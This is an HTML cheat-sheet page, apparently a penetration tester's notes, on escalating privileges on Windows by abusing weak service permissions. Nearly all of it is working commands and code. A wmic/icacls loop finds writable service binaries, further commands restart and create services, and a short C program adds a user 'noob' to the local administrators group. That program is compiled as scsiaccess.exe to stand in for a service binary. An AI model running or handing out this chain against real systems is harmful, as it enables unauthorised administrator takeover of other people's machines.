<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Weak services</title>
</head><body><b><span style="font-size: 12pt">SEARCH FOR WEAK SERVICES CLI</span><br/>
<br/>
1. See accesschk.exe page in Windows shell page<br/>
<br/>
or<br/>
<br/>
2. Commands for service permission check (<tt>wmic </tt>and <tt>icacls </tt>used)<br/>
</b><br/>
icacls	(&gt;=Vista or up)<br/>
cacls	(&lt;	XP)<b><br/>
</b><tt>for /f &quot;tokens=2 delims='='&quot; %a in ('wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;') do @echo %a &gt;&gt; c:\windows\temp\permissions.txt<br/>
</tt><tt>for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;</tt><b><br/>
</b><b><br/>
<br/>
<br/>
Restart the Service<br/>
</b><tt><br/>
wmic service NAMEOFSERVICE call startservice<br/>
net stop [service name] &amp;&amp; net start [service name]<br/>
<br/>
</tt><b>Create and start binary with system privileges (need administrator privileges)</b><br/>
<tt><br/>
sc create &lt;servicename&gt; binpath= &quot;&lt;pathtobinaryexecutable&gt;&quot; DisplayName= &lt;displayname&gt;<br/>
sc start &lt;servicename&gt;<br/>
<br/>
</tt><b>Code which add user <i>noob</i>to administrative group<br/>
</b><br/>
<tt>#include &lt;stdlib.h&gt; /* system, NULL, EXIT_FAILURE */<br/>
<br/>
int main ()<br/>
{<br/>
 int i;<br/>
 i = system(&quot;net localgroup administrators noob /add&quot;);<br/>
 return 0;<br/>
</tt><tt>}</tt><br/>
<br/>
Compile with<b><br/>
</b><tt>i686-w64-mingw32-gcc -o scsiaccess.exe useradd.c<br/>
</tt></body></html>